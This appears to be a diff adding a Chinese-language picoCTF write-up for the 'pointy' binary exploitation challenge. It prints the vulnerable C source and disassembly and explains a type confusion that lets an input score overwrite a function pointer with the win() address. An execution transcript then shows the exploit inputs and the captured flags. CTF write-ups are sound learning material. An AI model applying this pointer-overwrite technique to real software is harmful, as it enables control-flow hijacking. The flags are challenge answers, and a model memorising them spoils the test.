@@ -942,3 +942,194 @@ r.interactive()
 ```
 ~~picoCTF{g0ttA_cl3aR_y0uR_m4110c3d_m3m0rY_8aa9bc45}~~
 picoCTF{g0ttA_cl3aR_y0uR_m4110c3d_m3m0rY_406af1a1}
+## pointy - Points: 350 - (Solves: 354)Binary Exploitation
+當初看到根本不知道要從何下手
+
+網上大大 表示 因為 兩個結構 professor student size 一樣大 4bye
+
+所以 lastScore 偏移會對應到 那串function pointer 看下面 asm
+
+照main正常邏輯走 它會遇到  輸入要評分的 學生 和 教授
+
+這裡有bug 你發現 `retrieveProfessor` `retrieveStudent`
+
+這兩函數根本一樣 都是去從 `ADDRESSES` 找東西 阿大家東西鬥也放在裡面
+
+就是這剛好  所以  輸入要評分的 學生 和 教授 這裡 教授可以輸入 學生的名字進去
+
+然猴 要你輸入 分數 你就輸入 win addr 進去 蓋掉 student 裡的function pointer
+
+它scanf 是 %u  == unsigned int
+
+win addr
+>>> 0x08048696
+134514326
+
+
+
+下次call 它 就會噴 flag
+
+---
+可以看到 它根本不管你是啥型態
+
+你給它 東西 它就是往 offset 4 byte 裡 塞東西進去
+
+```
+fcn) sym.giveScoreToProfessor 58
+|           sym.giveScoreToProfessor (int professor, int score);
+            ;var int local_4h @ ebp-0x4
+|           ; arg int professor @ ebp+0x8
+|           ; arg int score @ ebp+0xc
+|           0x0804872f      55             push ebp
+|           0x08048730      89e5           mov ebp, esp
+|           0x08048732      53             push ebx
+|           0x08048733      83ec04         sub esp, 4
+|           0x08048736      e877030000     call sym.__x86.get_pc_thunk.ax
+|           0x0804873b      05c5180000     add eax, 0x18c5
+|           0x08048740      8b5508         mov edx, dword [professor]  ; [0x8:4]=-1 ; 8
+|           0x08048743      8b4d0c         mov ecx, dword [score]      ; [0xc:4]=-1 ; 12
+|           0x08048746      898a80000000   mov dword [edx + 0x80], ecx
+|           0x0804874c      83ec08         sub esp, 8
+|           0x0804874f      ff750c         push dword [score]
+|           0x08048752      8d906bebffff   lea edx, dword [eax - 0x1495]
+|           0x08048758      52             push edx
+|           0x08048759      89c3           mov ebx, eax
+|           0x0804875b      e860fdffff     call sym.imp.printf         ; int printf(const char *format)
+|           0x08048760      83c410         add esp, 0x10
+|           0x08048763      90             nop
+|           0x08048764      8b5dfc         mov ebx, dword [local_4h]
+|           0x08048767      c9             leave
+\           0x08048768      c3             ret
+```
+
+### code
+```
+#include <stdlib.h>
+#include <stdio.h>
+#include <stdint.h>
+#include <string.h>
+#include <unistd.h>
+#include <fcntl.h>
+
+#define FLAG_BUFFER 128
+#define NAME_SIZE 128
+#define MAX_ADDRESSES 1000
+
+int ADRESSES_TAKEN=0;
+void *ADDRESSES[MAX_ADDRESSES];
+
+void win() {
+    char buf[FLAG_BUFFER];
+    FILE *f = fopen("flag.txt","r");
+    fgets(buf,FLAG_BUFFER,f);
+    puts(buf);
+    fflush(stdout);
+}
+
+struct Professor {
+    char name[NAME_SIZE];
+    int lastScore; //4byte
+};
+
+struct Student {
+    char name[NAME_SIZE];
+    void (*scoreProfessor)(struct Professor*, int); //4bye
+};
+
+void giveScoreToProfessor(struct Professor* professor, int score){
+    professor->lastScore=score;
+    printf("Score Given: %d \n", score);
+
+}
+
+void* retrieveProfessor(char * name ){
+    for(int i=0; i<ADRESSES_TAKEN;i++){
+        if( strncmp(((struct Student*)ADDRESSES[i])->name, name ,NAME_SIZE )==0){
+            return ADDRESSES[i];
+        }
+    }
+    puts("person not found... see you!");
+    exit(0);
+}
+
+void* retrieveStudent(char * name ){
+    for(int i=0; i<ADRESSES_TAKEN;i++){
+        if( strncmp(((struct Student*)ADDRESSES[i])->name, name ,NAME_SIZE )==0){
+            return ADDRESSES[i];
+        }
+    }
+    puts("person not found... see you!");
+    exit(0);
+}
+
+void readLine(char * buff){
+    int lastRead = read(STDIN_FILENO, buff, NAME_SIZE-1);
+    if (lastRead<=1){
+        exit(0);
+        puts("could not read... see you!");
+    }
+    buff[lastRead-1]=0;
+}
+
+int main (int argc, char **argv)
+{
+    while(ADRESSES_TAKEN<MAX_ADDRESSES-1){
+        printf("Input the name of a student\n");
+        struct Student* student = (struct Student*)malloc(sizeof(struct Student)); // 要一個 addr 存 student
+        ADDRESSES[ADRESSES_TAKEN]=student;
+        readLine(student->name);
+        printf("Input the name of the favorite professor of a student \n");
+        struct Professor* professor = (struct Professor*)malloc(sizeof(struct Professor));
+        ADDRESSES[ADRESSES_TAKEN+1]=professor;
+        readLine(professor->name);
+        student->scoreProfessor=&giveScoreToProfessor;
+        ADRESSES_TAKEN+=2;
+        printf("Input the name of the student that will give the score \n");
+        char  nameStudent[NAME_SIZE];
+        readLine(nameStudent);
+        student=(struct Student*) retrieveStudent(nameStudent);
+        printf("Input the name of the professor that will be scored \n");
+        char nameProfessor[NAME_SIZE];
+        readLine(nameProfessor);
+        professor=(struct Professor*) retrieveProfessor(nameProfessor);
+        puts(professor->name);
+        unsigned int value;
+	      printf("Input the score: \n");
+	      scanf("%u", &value);
+        student->scoreProfessor(professor, value);
+    }
+    return 0;
+}
+```
+### execute
+```
+Input the name of a student
+s
+Input the name of the favorite professor of a student
+p
+Input the name of the student that will give the score
+s
+Input the name of the professor that will be scored
+s
+s
+Input the score:
+134514326
+Score Given: 134514326
+Input the name of a student
+ss
+Input the name of the favorite professor of a student
+pp
+Input the name of the student that will give the score
+s
+Input the name of the professor that will be scored
+s
+s
+Input the score:
+0
+picoCTF{g1v1ng_d1R3Ct10n5_409abf51}
+Input the name of a student
+
+
+
+```
+picoCTF{g1v1ng_d1R3Ct10n5_409abf51}
